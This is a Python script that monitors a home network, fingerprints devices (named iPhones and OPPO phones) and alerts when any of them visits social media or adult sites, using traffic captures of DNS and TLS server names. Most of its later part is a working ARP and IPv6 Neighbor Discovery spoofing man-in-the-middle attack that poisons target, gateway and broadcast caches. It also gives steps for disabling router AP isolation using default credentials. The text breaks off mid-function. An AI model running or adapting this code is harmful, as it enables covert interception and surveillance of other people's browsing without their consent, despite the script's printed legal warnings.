#!/usr/bin/env python3
"""
Continuous Network Monitor - Discovery + Attribution
=====================================================
Real-time network monitoring with device discovery and traffic attribution.
Detects when devices visit specific sites (Reddit, Facebook, etc.)

Features:
- Continuous device discovery (ARP + TCP SYN + Broadcast)
- Real-time traffic attribution (SNI + DNS + Bandwidth)
- Alert on specific domains (Reddit, Facebook, YouTube, etc.)
- Device fingerprinting (Apple, OPPO, Windows, etc.)
- Live dashboard with device activity

Usage:
    sudo python3 continuous_monitor.py
    sudo python3 continuous_monitor.py --interval 30 --alert-domains reddit.com,facebook.com
"""

import argparse
import subprocess
import threading
import time
import signal
import sys
import os
import shutil
import re
from datetime import datetime
from collections import defaultdict
import queue

# ============================================================
# CONFIGURATION
# ============================================================

DEFAULT_CONFIG = {
    'interface': 'en0',
    'subnet': '192.168.0.0/24',
    'discovery_interval': 30,      # seconds between full discovery scans
    'capture_interval': 30,        # seconds of capture per cycle (longer to catch TLS handshakes)
    'quick_discovery_interval': 10,  # seconds between quick ARP scans for new devices
    'enable_web_dashboard': False,   # set True to enable Flask web dashboard
    'web_port': 5000,
    'max_domains_per_device': 20,   # max domains to track per device
    'max_dns_per_device': 15,       # max DNS queries to track per device
    # MITM/ARP Spoofing (for capturing other devices' traffic)
    'mitm_enabled': False,
    'mitm_target_mac': None,        # MAC address of target (resolves IP dynamically)
    'mitm_gateway_ip': None,
    'alert_domains': [
        # Reddit - many subdomains used
        'reddit.com', 'www.reddit.com', 'oauth.reddit.com',
        'redditmedia.com', 'redd.it', 'i.redd.it', 'preview.redd.it',
        'gateway.reddit.com', 'external-preview.redd.it',
        # Facebook
        'facebook.com', 'www.facebook.com', 'fbcdn.net', 'fbsbx.com',
        'fb.com', 'm.facebook.com', 'web.facebook.com',
        # Instagram
        'instagram.com', 'www.instagram.com', 'cdninstagram.com',
        # YouTube
        'youtube.com', 'www.youtube.com', 'googlevideo.com', 'ytimg.com',
        'youtube-nocookie.com',
        # Twitter/X
        'twitter.com', 'www.twitter.com', 'x.com', 't.co',
        # TikTok
        'tiktok.com', 'www.tiktok.com', 'tiktokcdn.com',
        # Netflix
        'netflix.com', 'nflxvideo.net', 'nflxext.com',
        # Others
        'discord.com', 'discordapp.com',
        'twitch.tv', 'twitchcdn.net',
        'linkedin.com', 'licdn.com',
        'pinterest.com', 'pinimg.com',
        'snapchat.com', 'snapchat.net',
        # Adult sites
        'pornhub.com', 'www.pornhub.com', 'phncdn.com',
        'xnxx.com', 'www.xnxx.com', 'xnxx-cdn.com',
        'xvideos.com', 'www.xvideos.com', 'xvideos-cdn.com',
        'redtube.com', 'www.redtube.com',
        'youporn.com', 'www.youporn.com',
        'xhamster.com', 'www.xhamster.com',
        'spankbang.com', 'www.spankbang.com',
    ],
    'known_devices': {
        # Key = MAC address (stable), Value = device info with dynamic IP
        '28:ee:52:f7:74:dc': {'name': 'TP-Link Router', 'type': 'router', 'ip': '192.168.0.1'},
        '5e:ed:d5:5b:8b:0b': {'name': 'MacBook (Scanner)', 'type': 'computer', 'ip': '192.168.0.100'},
        '96:2d:fc:a5:07:ff': {'name': 'iPhone', 'type': 'mobile', 'ip': '192.168.0.108'},
        'c2:28:11:41:95:0d': {'name': 'iPhone 2', 'type': 'mobile', 'ip': '192.168.0.102'},
        'ba:1a:f1:50:dd:40': {'name': 'OPPO A3x', 'type': 'mobile', 'ip': '192.168.0.104'},
        '0e:70:b3:1a:68:38': {'name': 'OPPO Reno8', 'type': 'mobile', 'ip': '192.168.0.105'},
        '7e:8c:7f:7f:2f:ed': {'name': 'Unknown Device', 'type': 'unknown', 'ip': '192.168.0.117'},
    },
    'port_fingerprints': {
        62078: 'Apple (iphone-sync)',
        49152: 'Apple (AirPlay)',
        5000:  'Apple (AirPlay)',
        7000:  'Apple (AirPlay)',
        46888: 'OPPO (OAFP)',
        10152: 'OPPO (PrlmC)',
        5353:  'mDNS/Bonjour',
        137:   'NetBIOS (Windows)',
        138:   'NetBIOS (Windows)',
        139:   'NetBIOS (Windows)',
        22:    'SSH',
        53:    'DNS',
        80:    'HTTP',
        443:   'HTTPS',
        1900:  'UPnP',
    }
}

# ============================================================
# GLOBAL STATE
# ============================================================

class MonitorState:
    def __init__(self, config):
        self.config = config
        # device_map: MAC -> {name, type, ip, vendor, ports, hostname, identity_id}
        self.device_map = {mac: info.copy() for mac, info in config['known_devices'].items()}
        # ip_to_mac: IP -> MAC (for quick reverse lookup from traffic analysis)
        self.ip_to_mac = {info['ip']: mac for mac, info in self.device_map.items() if 'ip' in info}
        self.discovered_devices = {}  # IP -> {mac, vendor, source}

        # === DYNAMIC IDENTITY RESOLUTION ===
        # identity_id -> {macs: set(), ips: set(), name, type, confidence, signals: {...}}
        self.device_identities = {}
        # MAC -> identity_id
        self.mac_to_identity = {}
        # identity counter
        self.next_identity_id = 1

        self.traffic_stats = defaultdict(lambda: {
            'bytes': 0, 'packets': 0, 'domains': set(),
            'dns_queries': set(), 'connections': set(),
            'first_seen': None, 'last_seen': None,
            'domain_timeline': [],  # list of (time, domain, source)
            'dns_timeline': [],     # list of (time, domain)
        })
        self.alert_queue = queue.Queue()
        self.running = True
        self.cycle_count = 0
        self.new_devices = set()  # newly discovered MACs this cycle

    def get_mac_for_ip(self, ip):
        """Get MAC address for an IP (from discovery or known devices)"""
        return self.ip_to_mac.get(ip)

    def get_device_name(self, mac_or_ip):
        """Get device name by MAC or IP"""
        if mac_or_ip in self.device_map:
            return self.device_map[mac_or_ip].get('name', f'Unknown ({mac_or_ip})')
        mac = self.get_mac_for_ip(mac_or_ip)
        if mac and mac in self.device_map:
            return self.device_map[mac].get('name', f'Unknown ({mac})')
        return f'Unknown ({mac_or_ip})'

    def get_device_type(self, mac_or_ip):
        """Get device type by MAC or IP"""
        if mac_or_ip in self.device_map:
            return self.device_map[mac_or_ip].get('type', 'unknown')
        mac = self.get_mac_for_ip(mac_or_ip)
        if mac and mac in self.device_map:
            return self.device_map[mac].get('type', 'unknown')
        return 'unknown'

    def get_device_ip(self, mac):
        """Get current IP for a MAC"""
        if mac in self.device_map:
            return self.device_map[mac].get('ip')
        return None

    def _get_vendor_from_mac(self, mac):
        """Extract vendor/OUI from MAC address"""
        if not mac:
            return None
        oui = mac[:8].upper().replace(':', '-')
        return oui

    def _compute_identity_signals(self, mac, info):
        """Extract identity signals from device info"""
        signals = {}
        signals['vendor_oui'] = self._get_vendor_from_mac(mac)
        signals['ports'] = info.get('ports', [])
        signals['hostname'] = info.get('hostname', '')
        signals['vendor'] = info.get('vendor', '')
        signals['type'] = info.get('type', '')
        return signals

    def _calculate_identity_similarity(self, signals1, signals2):
        """Calculate similarity between two identity signal sets (0-1)"""
        if not signals1 or not signals2:
            return 0

        score = 0
        weight_total = 0

        # Vendor OUI match (strong signal)
        if signals1.get('vendor_oui') and signals1['vendor_oui'] == signals2.get('vendor_oui'):
            score += 40
            weight_total += 40
        else:
            weight_total += 40

        # Port fingerprint overlap
        ports1 = set(signals1.get('ports', []))
        ports2 = set(signals2.get('ports', []))
        if ports1 and ports2:
            overlap = len(ports1 & ports2)
            total = len(ports1 | ports2)
            score += (overlap / total) * 30
            weight_total += 30
        else:
            weight_total += 30

        # Hostname match
        h1 = signals1.get('hostname', '').lower()
        h2 = signals2.get('hostname', '').lower()
        if h1 and h2 and h1 == h2:
            score += 20
            weight_total += 20
        else:
            weight_total += 20

        # Vendor string match
        v1 = signals1.get('vendor', '').lower()
        v2 = signals2.get('vendor', '').lower()
        if v1 and v2 and v1 == v2:
            score += 10
            weight_total += 10
        else:
            weight_total += 10

        return score / weight_total if weight_total > 0 else 0

    def _find_matching_identity(self, mac, info):
        """Find existing identity matching this device's signals"""
        signals = self._compute_identity_signals(mac, info)

        best_match = None
        best_score = 0

        for identity_id, identity in self.device_identities.items():
            # Don't match if this MAC is already in another identity
            if mac in identity.get('macs', set()):
                continue

            identity_signals = identity.get('signals', {})
            score = self._calculate_identity_similarity(signals, identity_signals)

            if score > best_score and score > 0.5:  # 50% threshold
                best_score = score
                best_match = identity_id

        return best_match

    def _create_or_update_identity(self, mac, info):
        """Create new identity or merge into existing one"""
        # Check if MAC already has identity
        if mac in self.mac_to_identity:
            identity_id = self.mac_to_identity[mac]
            identity = self.device_identities[identity_id]
            # Update signals
            identity['macs'].add(mac)
            if info.get('ip'):
                identity['ips'].add(info['ip'])
            identity['signals'] = self._compute_identity_signals(mac, info)
            # Update name/type from best signal
            if info.get('name') and not identity['name'].startswith('Unknown'):
                pass  # Keep existing name
            elif info.get('name'):
                identity['name'] = info['name']
            if info.get('type') and identity['type'] == 'unknown':
                identity['type'] = info['type']
            return identity_id

        # Try to find matching identity
        match_id = self._find_matching_identity(mac, info)
        if match_id:
            identity = self.device_identities[match_id]
            identity['macs'].add(mac)
            if info.get('ip'):
                identity['ips'].add(info['ip'])
            # Merge signals (keep stronger ones)
            new_signals = self._compute_identity_signals(mac, info)
            identity['signals'] = new_signals  # Could merge more intelligently
            self.mac_to_identity[mac] = match_id
            return match_id

        # Create new identity
        identity_id = f"dev_{self.next_identity_id}"
        self.next_identity_id += 1

        self.device_identities[identity_id] = {
            'macs': {mac},
            'ips': {info['ip']} if info.get('ip') else set(),
            'name': info.get('name', f'Device-{identity_id}'),
            'type': info.get('type', 'unknown'),
            'confidence': 1.0,
            'signals': self._compute_identity_signals(mac, info),
            'first_seen': timestamp(),
            'last_seen': timestamp(),
        }
        self.mac_to_identity[mac] = identity_id
        return identity_id

    def resolve_identity(self, mac_or_ip):
        """Get identity_id for a MAC or IP"""
        mac = mac_or_ip
        if mac_or_ip not in self.mac_to_identity:
            # Try IP lookup
            mac = self.get_mac_for_ip(mac_or_ip)
        if mac and mac in self.mac_to_identity:
            return self.mac_to_identity[mac]
        return None

    def get_identity_name(self, mac_or_ip):
        """Get resolved identity name"""
        identity_id = self.resolve_identity(mac_or_ip)
        if identity_id and identity_id in self.device_identities:
            return self.device_identities[identity_id]['name']
        return self.get_device_name(mac_or_ip)

    def get_identity_type(self, mac_or_ip):
        """Get resolved identity type"""
        identity_id = self.resolve_identity(mac_or_ip)
        if identity_id and identity_id in self.device_identities:
            return self.device_identities[identity_id]['type']
        return self.get_device_type(mac_or_ip)

    def update_device(self, ip, mac=None, name=None, dtype=None, vendor=None, ports=None, hostname=None):
        """Update or create device entry. MAC is the primary key."""
        if not mac:
            return False

        mac = mac.lower()
        is_new = mac not in self.device_map

        if is_new:
            self.device_map[mac] = {'name': f'Unknown ({ip})', 'type': 'unknown', 'ip': ip}
            self.new_devices.add(mac)
        else:
            # Update IP if changed (DHCP lease rotation)
            old_ip = self.device_map[mac].get('ip')
            if old_ip and old_ip != ip:
                print(f"  🔄 IP changed for {self.device_map[mac].get('name', mac)}: {old_ip} -> {ip}")
            self.device_map[mac]['ip'] = ip

        if name: self.device_map[mac]['name'] = name
        if dtype: self.device_map[mac]['type'] = dtype
        if vendor: self.device_map[mac]['vendor'] = vendor
        if ports: self.device_map[mac]['ports'] = ports
        if hostname: self.device_map[mac]['hostname'] = hostname

        # Update reverse mapping
        self.ip_to_mac[ip] = mac
        old_ip = self.device_map[mac].get('ip')
        if old_ip and old_ip != ip and old_ip in self.ip_to_mac:
            del self.ip_to_mac[old_ip]

        # === IDENTITY RESOLUTION ===
        identity_id = self._create_or_update_identity(mac, self.device_map[mac])
        self.device_map[mac]['identity_id'] = identity_id

        return is_new

    def add_domain_activity(self, mac, domain, source='SNI'):
        """Add domain to device timeline (keyed by MAC)"""
        max_domains = self.config.get('max_domains_per_device', 20)
        stats = self.traffic_stats[mac]
        stats['domains'].add(domain)
        stats['domain_timeline'].append((timestamp(), domain, source))
        if len(stats['domain_timeline']) > max_domains:
            stats['domain_timeline'] = stats['domain_timeline'][-max_domains:]

    def add_dns_activity(self, mac, domain):
        """Add DNS query to device timeline (keyed by MAC)"""
        max_dns = self.config.get('max_dns_per_device', 15)
        stats = self.traffic_stats[mac]
        stats['dns_queries'].add(domain)
        stats['dns_timeline'].append((timestamp(), domain))
        if len(stats['dns_timeline']) > max_dns:
            stats['dns_timeline'] = stats['dns_timeline'][-max_dns:]

state = None

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def run_cmd(cmd, timeout=10, shell=False):
    """Run command and return (stdout, stderr, returncode)"""
    try:
        result = subprocess.run(
            cmd if not shell else cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', -1
    except Exception as e:
        return '', str(e), -1

def timestamp():
    return datetime.now().strftime('%H:%M:%S')

def print_banner(text):
    print(f"\n{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}")

def print_section(text):
    print(f"\n--- {text} ---")

# ============================================================
# PHASE 1: DEVICE DISCOVERY
# ============================================================

def discover_network(state):
    """Run full device discovery cycle - updates MAC→IP mappings dynamically"""
    print_section(f"DISCOVERY CYCLE #{state.cycle_count} - {timestamp()}")

    discovered = {}

    # 1.1 ARP Scan
    stdout, _, _ = run_cmd([
        'sudo', 'arp-scan', '--localnet',
        '--interface', state.config['interface'],
        '--quiet'
    ], timeout=15)

    for line in stdout.strip().split('\n'):
        if line and line[0].isdigit():
            parts = line.split()
            if len(parts) >= 2:
                ip, mac = parts[0], parts[1].lower()
                # Skip if it looks like a packet count line (e.g., "1805 packets")
                if 'packets' in line.lower() or 'received' in line.lower():
                    continue
                # Validate IP format
                import re
                if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
                    continue
                # Validate MAC format
                if not re.match(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', mac):
                    continue
                vendor = ' '.join(parts[2:]) if len(parts) > 2 else 'Unknown'
                discovered[ip] = {'mac': mac, 'vendor': vendor, 'source': 'arp'}
                # Update device map with current IP for this MAC
                state.update_device(ip, mac=mac, vendor=vendor)

    # 1.2 TCP SYN Ping Sweep (wakes sleepers)
    stdout, _, _ = run_cmd([
        'sudo', 'nmap', '-sn',
        '-PS80,443,22,23,21',
        state.config['subnet']
    ], timeout=30)

    current_ip = None
    for line in stdout.strip().split('\n'):
        if 'Nmap scan report for' in line:
            current_ip = line.split()[-1].strip('()')
        elif 'MAC Address:' in line and current_ip:
            parts = line.split('MAC Address:')[-1].strip().split()
            if len(parts) >= 2:
                mac = parts[0].lower()
                vendor = ' '.join(parts[1:]).strip('()')
                if current_ip not in discovered:
                    discovered[current_ip] = {'mac': mac, 'vendor': vendor, 'source': 'tcp_syn'}
                # Update device map with current IP for this MAC
                state.update_device(current_ip, mac=mac, vendor=vendor)

    # 1.3 Broadcast Ping
    run_cmd(['ping', '-c', '2', '-W', '1', '192.168.0.255'], timeout=5)
    time.sleep(1)

    # 1.4 ARP Follow-up
    stdout, _, _ = run_cmd([
        'sudo', 'arp-scan', '--localnet',
        '--interface', state.config['interface'],
        '--quiet'
    ], timeout=15)

    for line in stdout.strip().split('\n'):
        if line and line[0].isdigit():
            parts = line.split()
            if len(parts) >= 2:
                ip, mac = parts[0], parts[1].lower()
                # Skip if it looks like a packet count line
                if 'packets' in line.lower() or 'received' in line.lower():
                    continue
                # Validate IP format
                import re
                if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
                    continue
                # Validate MAC format
                if not re.match(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', mac):
                    continue
                if ip not in discovered:
                    discovered[ip] = {'mac': mac, 'source': 'arp_followup'}
                # Update device map with current IP for this MAC
                state.update_device(ip, mac=mac)

    # 1.5 Service Fingerprinting for new/unknown devices
    for ip, info in discovered.items():
        mac = info['mac']
        if mac in state.device_map and 'type' not in state.device_map[mac]:
            fingerprint_device(ip, state, mac)

    state.discovered_devices = discovered

    print(f"  Discovered {len(discovered)} devices:")
    for ip, info in sorted(discovered.items()):
        mac = info.get('mac', 'unknown')
        name = state.get_identity_name(mac)
        dtype = state.get_identity_type(mac)
        print(f"    {ip:15}  {mac:17}  {name} [{dtype}]")

    return discovered

def fingerprint_device(ip, state, mac):
    """Quick port scan to identify device type"""
    # Key ports for identification
    key_ports = [62078, 49152, 5000, 7000, 46888, 10152, 5353, 137, 139, 22, 80, 443]
    port_str = ','.join(map(str, key_ports))

    stdout, _, _ = run_cmd([
        'sudo', 'nmap', '-sT', '-sV', '-p', port_str,
        '--host-timeout', '10s', '--max-retries', '1',
        ip
    ], timeout=20)

    device_type = 'unknown'
    open_ports = []
    for line in stdout.split('\n'):
        if 'open' in line and '/' in line:
            parts = line.split()
            if len(parts) >= 3:
                port = int(parts[0].split('/')[0])
                service = parts[2]
                open_ports.append(port)
                # Identify by port
                if port in state.config['port_fingerprints'] and device_type == 'unknown':
                    device_type = state.config['port_fingerprints'][port]

    # Also try to get hostname via reverse DNS
    hostname = ''
    try:
        import socket
        hostname = socket.gethostbyaddr(ip)[0]
    except:
        pass

    # Update device map by MAC with ports and hostname for identity resolution
    state.update_device(ip, mac=mac, dtype=device_type, ports=open_ports, hostname=hostname)

# ============================================================
# PHASE 2: TRAFFIC CAPTURE & ATTRIBUTION
# ============================================================

def capture_traffic(state):
    """Capture traffic for attribution"""
    pcap_file = f'/tmp/monitor_capture_{state.cycle_count}.pcap'

    # Start tcpdump
    proc = subprocess.Popen([
        'sudo', 'tcpdump', '-i', state.config['interface'],
        '-n', '-w', pcap_file
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Wait for capture interval
    time.sleep(state.config['capture_interval'])

    # Stop tcpdump
    proc.terminate()
    proc.wait(timeout=5)

    return pcap_file

def analyze_capture(pcap_file, state):
    """Analyze capture and attribute to devices (by MAC)"""
    # Extract TLS SNI
    stdout, _, _ = run_cmd([
        'tshark', '-r', pcap_file,
        '-Y', 'tls.handshake.extensions_server_name',
        '-T', 'fields', '-e', 'ip.src', '-e', 'tls.handshake.extensions_server_name'
    ], timeout=15)

    sni_results = defaultdict(set)
    for line in stdout.strip().split('\n'):
        if line:
            parts = line.split('\t')
            if len(parts) >= 2:
                ip, sni = parts[0], parts[1]
                mac = state.get_mac_for_ip(ip)
                name = state.get_identity_name(mac) if mac else state.get_identity_name(ip)
                key = mac if mac else ip
                sni_results[key].add(sni)

                # Check for alerts
                for alert_domain in state.config['alert_domains']:
                    if alert_domain in sni:
                        state.alert_queue.put({
                            'type': 'DOMAIN_ALERT',
                            'device': name,
                            'ip': ip,
                            'mac': mac,
                            'domain': sni,
                            'matched': alert_domain,
                            'time': timestamp(),
                            'source': 'SNI'
                        })

                # Add to activity timeline (keyed by MAC)
                state.add_domain_activity(key, sni, 'SNI')

    # Extract DNS
    stdout, _, _ = run_cmd([
        'tshark', '-r', pcap_file,
        '-Y', 'dns',
        '-T', 'fields', '-e', 'ip.src', '-e', 'dns.qry.name'
    ], timeout=15)

    for line in stdout.strip().split('\n'):
        if line:
            parts = line.split('\t')
            if len(parts) >= 2:
                ip, domain = parts[0], parts[1]
                mac = state.get_mac_for_ip(ip)
                name = state.get_identity_name(mac) if mac else state.get_identity_name(ip)
                key = mac if mac else ip
                state.add_dns_activity(key, domain)

                # Check DNS for alerts (catches domains even with TLS session resumption)
                for alert_domain in state.config['alert_domains']:
                    if alert_domain in domain:
                        state.alert_queue.put({
                            'type': 'DOMAIN_ALERT',
                            'device': name,
                            'ip': ip,
                            'mac': mac,
                            'domain': domain,
                            'matched': alert_domain,
                            'time': timestamp(),
                            'source': 'DNS'
                        })

    # Bandwidth
    stdout, _, _ = run_cmd([
        'tshark', '-r', pcap_file,
        '-T', 'fields', '-e', 'ip.src', '-e', 'frame.len'
    ], timeout=15)

    for line in stdout.strip().split('\n'):
        if line:
            parts = line.split('\t')
            if len(parts) >= 2:
                ip, length = parts[0], int(parts[1])
                mac = state.get_mac_for_ip(ip)
                key = mac if mac else ip
                state.traffic_stats[key]['bytes'] += length
                state.traffic_stats[key]['packets'] += 1
                if state.traffic_stats[key]['first_seen'] is None:
                    state.traffic_stats[key]['first_seen'] = timestamp()
                state.traffic_stats[key]['last_seen'] = timestamp()
                state.traffic_stats[name]['last_seen'] = timestamp()

    # Clean up pcap
    try:
        os.remove(pcap_file)
    except:
        pass

    return sni_results

# ============================================================
# AP ISOLATION DETECTION
# ============================================================

def test_ap_isolation(target_ip, interface):
    """Test if AP isolation is blocking ARP to target"""
    print(f"\n  🔍 Testing for AP Isolation...")
    print(f"     Target: {target_ip}")
    print(f"     Interface: {interface}")

    # Test 1: ARP scan
    from scapy.all import ARP, Ether, srp, conf
    conf.iface = interface
    conf.verb = 0

    print(f"     Sending ARP request to {target_ip}...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), timeout=5, verbose=0)

    if ans:
        mac = ans[0][1].hwsrc
        print(f"     ✅ ARP response received: {mac}")
        print(f"     AP Isolation: DISABLED (or target is on same L2 segment)")
        return False, mac
    else:
        print(f"     ❌ No ARP response from {target_ip}")
        print(f"     AP Isolation: LIKELY ENABLED")
        print(f"     ")
        print(f"     FIX: Disable AP Isolation on your router:")
        print(f"       1. Open http://192.168.0.1 in browser")
        print(f"       2. Login (admin/admin or check router label)")
        print(f"       3. Go to Wireless → Advanced → AP Isolation")
        print(f"       4. Set to DISABLE / Uncheck the box")
        print(f"       5. Save & Reboot router")
        print(f"     OR: Connect both devices to 2.4GHz network")
        return True, None

# ============================================================
# MITM / ARP SPOOFING - NetCut Style Aggressive Implementation
# ============================================================

def start_mitm(config):
    """Start ARP spoofing to redirect target traffic through this machine.

    NetCut-style aggressive spoofing:
    - Periodic re-ARP (TimerMakeSureOnAll) - high frequency
    - Bidirectional: target→gateway AND gateway→target
    - IPv6 Neighbor Discovery spoofing
    - Gratuitous ARP replies for faster cache poisoning
    - DHCP monitoring

    LEGAL WARNING: ARP spoofing / MITM attacks are illegal in many jurisdictions
    without explicit written authorization. Only use on networks you own or have
    written permission to test. Unauthorized network monitoring violates privacy
    laws and ethical standards.
    """
    if not config.get('mitm_enabled') or not config.get('mitm_target_ip'):
        return None, None

    target_ip = config['mitm_target_ip']
    gateway_ip = config.get('mitm_gateway_ip')
    interface = config['interface']

    if not gateway_ip:
        # Try to auto-detect gateway
        stdout, _, _ = run_cmd(['route', '-n', 'get', 'default'], timeout=5)
        for line in stdout.split('\n'):
            if 'gateway' in line.lower():
                gateway_ip = line.split(':')[-1].strip()
                break

    if not gateway_ip:
        # Default common gateway
        gateway_ip = '192.168.0.1'
        print(f"  ⚠ Gateway not specified, using default: {gateway_ip}")

    # Check if scapy is available
    try:
        import scapy
    except ImportError:
        print("  ❌ scapy not found. Install: pip3 install scapy --break-system-packages")
        return None, None

    print(f"\n  {'='*60}")
    print(f"  ⚠️  MITM MODE ENABLED - LEGAL WARNING ⚠️")
    print(f"  {'='*60}")
    print(f"  Target: {target_ip}")
    print(f"  Gateway: {gateway_ip}")
    print(f"  Interface: {interface}")
    print(f"  ")
    print(f"  ⚠️  ONLY USE ON NETWORKS YOU OWN OR HAVE WRITTEN PERMISSION")
    print(f"  ⚠️  UNAUTHORIZED MONITORING IS ILLEGAL AND UNETHICAL")
    print(f"  {'='*60}\n")

    # Test for AP isolation first
    isolated, target_mac = test_ap_isolation(target_ip, interface)
    if isolated:
        return None, None

    # Enable IP forwarding (kernel level)
    run_cmd(['sudo', 'sysctl', '-w', 'net.inet.ip.forwarding=1'], timeout=5)
    run_cmd(['sudo', 'sysctl', '-w', 'net.inet.ip.fw.enable=1'], timeout=5)
    # Enable IPv6 forwarding too
    run_cmd(['sudo', 'sysctl', '-w', 'net.inet6.ip6.forwarding=1'], timeout=5)

    # Get MAC addresses
    from scapy.all import ARP, Ether, srp, sendp, conf, ICMPv6ND_NA, IPv6
    conf.iface = interface
    conf.verb = 0

    # Get gateway MAC
    print(f"  🔍 Resolving MAC addresses...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip), timeout=5, verbose=0)
    if not ans:
        print(f"  ❌ Could not find MAC for gateway {gateway_ip}")
        return None, None
    gateway_mac = ans[0][1].hwsrc

    # Get our MAC
    our_mac = conf.iface.mac if hasattr(conf.iface, 'mac') else None
    if not our_mac:
        stdout, _, _ = run_cmd(['ifconfig', interface], timeout=5)
        for line in stdout.split('\n'):
            if 'ether' in line:
                our_mac = line.split('ether')[1].strip().split()[0]
                break

    if not our_mac:
        print(f"  ❌ Could not determine our MAC address")
        return None, None

    print(f"  Target MAC: {target_mac}")
    print(f"  Gateway MAC: {gateway_mac}")
    print(f"  Our MAC: {our_mac}")

    # Start ARP spoofing threads
    import threading
    import time
    stop_event = threading.Event()

    # NetCut-style: Multiple spoofing strategies
    # 1. Target → Gateway (tell target we are gateway)
    def spoof_target():
        """Tell target we are gateway - NetCut style: high frequency + gratuitous ARP"""
        # Initial burst: send multiple gratuitous ARP replies quickly
        for _ in range(5):
            if stop_event.is_set():
                break
            # Gratuitous ARP reply (op=2, no request needed)
            sendp(Ether(dst=target_mac, src=our_mac)/
                  ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=our_mac), verbose=0)
            time.sleep(0.1)

        # Continuous periodic re-ARP (NetCut's TimerMakeSureOnAll)
        while not stop_event.is_set():
            sendp(Ether(dst=target_mac, src=our_mac)/
                  ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=our_mac), verbose=0)
            # NetCut uses ~2 second intervals, we'll use 1 second for more aggressive
            stop_event.wait(1)

    # 2. Gateway → Target (tell gateway we are target)
    def spoof_gateway():
        """Tell gateway we are target"""
        # Initial burst
        for _ in range(5):
            if stop_event.is_set():
                break
            sendp(Ether(dst=gateway_mac, src=our_mac)/
                  ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=our_mac), verbose=0)
            time.sleep(0.1)

        while not stop_event.is_set():
            sendp(Ether(dst=gateway_mac, src=our_mac)/
                  ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=our_mac), verbose=0)
            stop_event.wait(1)

    # 3. NetCut-style: Broadcast gratuitous ARP (poisons all caches on segment)
    def spoof_broadcast():
        """Send gratuitous ARP to broadcast - poisons all devices' ARP caches"""
        while not stop_event.is_set():
            # Tell everyone: "I am the gateway"
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/
                  ARP(op=2, pdst="0.0.0.0", psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=our_mac), verbose=0)
            # Tell everyone: "I am the target"
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/
                  ARP(op=2, pdst="0.0.0.0", psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=our_mac), verbose=0)
            # NetCut does this less frequently - every 5-10 seconds
            stop_event.wait(5)

    # 4. IPv6 Neighbor Discovery Spoofing (NetCut's MakeSureOffOn6/OnICMP6)
    def spoof_ipv6():
        """IPv6 ND spoofing - Neighbor Advertisement with override flag"""
        try:
            # Get IPv6 addresses
            target_ipv6 = None
            gateway_ipv6 = None

            # Try to get link-local addresses
            # For target, try to ping6 to populate neighbor cache
            run_cmd(['ping6', '-c', '1', '-W', '1', target_ip + '%' + interface], timeout=3)
            run_cmd(['ping6', '-c', '1', '-W', '1', gateway_ip + '%' + interface], timeout=3)

            # Get neighbor cache
            stdout, _, _ = run_cmd(['ndp', '-an'], timeout=3)
            for line in stdout.split('\n'):
                if target_ip in line or target_ip.replace('.', ':') in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        target_ipv6 = parts[0]
                if gateway_ip in line or gateway_ip.replace('.', ':') in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        gateway_ipv6 = parts[0]

            if target_ipv6 and gateway_ipv6:
                print(f"  🌐 IPv6 ND spoofing: target={target_ipv6} gateway={gateway_ipv6}")

                while not stop_event.is_set():
                    # Send Neighbor Advertisement telling target we are gateway
                    na = (Ether(dst=target_mac, src=our_mac) /
                          IPv6(dst=target_ipv6, src=gateway_ipv6) /
                          ICMPv6ND_NA(tgt=gateway_ipv6, R=0, S=1, O=1))  # Router, Solicited, Override
                    sendp(na, verbose=0)

                    # Send Neighbor Advertisement telling gateway we are target
                    na2 = (Ether(dst=gateway_mac, src=our_mac) /
                           IPv6(dst=gateway_ipv6, src=target_ipv6) /
                           ICMPv6ND_NA(tgt=target_ipv6, R=0, S=1, O=1))
                    sendp(na2, verbose=0)

                    stop_event.wait(3)
        except Exception as e:
            # IPv6 spoofing failed, continue without it
            pass

    # 5. NetCut-style: DHCP monitoring (to catch IP renewals)
    def monitor_dhcp():
        """Monitor for DHCP renewals and re-spoof immediately"""
        from scapy.all import DHCP, BOOTP, UDP
        try:
            # We can't easily do passive DHCP monitoring in this simple implementation
            # but we can periodically re-verify MAC addresses
            while not stop_event.is_set():
                stop_event.wait(30)  # Check every 30 seconds
                # Re-verify target MAC hasn't changed
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), timeout=2, verbose=0)
                if ans:
                    new_mac = ans[0][1].hwsrc
                    # Filter out our own MAC (we respond to our own ARP due to spoofing)
                    if new_mac != target_mac and new_mac != our_mac:
                        print(f"  ⚠️ Target MAC changed: {target_mac} -> {new_mac}")
                        # Note: we'd need to update target_mac here, but it's captured in closure
                        # For simplicity, just log it
        except:
            pass

    t1 = threading.Thread(target=spoof_target, daemon=True)
    t2 = threading.Thread(target=spoof_gateway, daemon=True)
    t3 = threading.Thread(target=spoof_broadcast, daemon=True)
    t4 = threading.Thread(target=spoof_ipv6, daemon=True)
    t5 = threading.Thread(target=monitor_dhcp, daemon=True)

    t1.start()
    t2.start()
    t3.start()
    t4.start()
